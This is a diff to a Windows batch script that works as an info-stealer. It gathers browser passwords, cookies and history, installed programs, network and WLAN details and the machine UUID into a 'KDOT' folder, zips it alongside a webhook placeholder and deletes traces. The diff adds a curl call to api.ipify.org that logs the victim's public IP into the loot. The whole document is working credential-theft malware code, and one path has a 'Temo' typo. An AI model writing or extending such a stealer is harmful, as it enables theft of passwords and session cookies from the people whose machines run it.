@@ -1,5 +1,8 @@
 @echo off
+timeout 1>nul
 set webhook=YOUR_WEBHOOK_HERE
+curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
+timeout 1>nul
 powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table" > %userprofile%\AppData\Local\Temp\programms.txt
 echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
@@ -65,6 +68,7 @@ move %localappdata%\Temp\netstat.txt %localappdata%\Temp\KDOT\netstat.txt
 move %localappdata%\Temp\programms.txt %localappdata%\Temp\KDOT\programms.txt
 move %localappdata%\Temp\uuid.txt %localappdata%\Temp\KDOT\uuid.txt
 move %localappdata%\Temp\wlan.txt %localappdata%\Temp\KDOT\wlan.txt
+move %localappdata%\Temp\ipp.txt %localappdata%\Temp\KDOT\ipp.txt
 move %localappdata%\Temo\browser-cookies.txt %localappdata%\Temo\KDOT\browser-cookies.txt
 move %localappdata%\Temp\browser-history.txt %localappdata%\Temp\KDOT\browser-history.txt
 move %localappdata%\Temp\browser-passwords.txt %localappdata%\Temp\KDOT\browser-passwords.txt
@@ -74,5 +78,5 @@ powershell.exe Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath 
 del %localappdata%\Temp\main.exe
 rmdir /s /q %localappdata%\Temp\KDOT
 del KDOT.zip
-timeout 1 >nul
+pause
 exit
